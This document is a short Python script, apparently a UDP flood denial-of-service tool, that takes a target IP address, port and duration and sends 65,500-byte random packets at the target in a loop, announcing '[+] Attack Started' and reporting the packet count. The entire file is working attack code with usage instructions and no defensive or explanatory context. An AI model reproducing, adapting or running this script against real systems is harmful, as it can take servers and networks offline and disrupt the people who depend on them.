import socket
import time
import random
import sys

if len(sys.argv) != 4:
    print(f"Usage: python3 {sys.argv[0]} <ip> <port> <time>")
    print(f"Example: python3 {sys.argv[0]} 1.2.3.4 80 60")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])

print(f'[+] Attack Started To: {target}:{port} Time: {duration}s')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(65500)

start = time.time()
sent = 0

while time.time() - start < duration:
    try:
        sock.sendto(packet, (target, port))
        sent += 1
    except:
        pass

print(f'[+] Done. Sent {sent} packets in {duration}s')
sock.close()
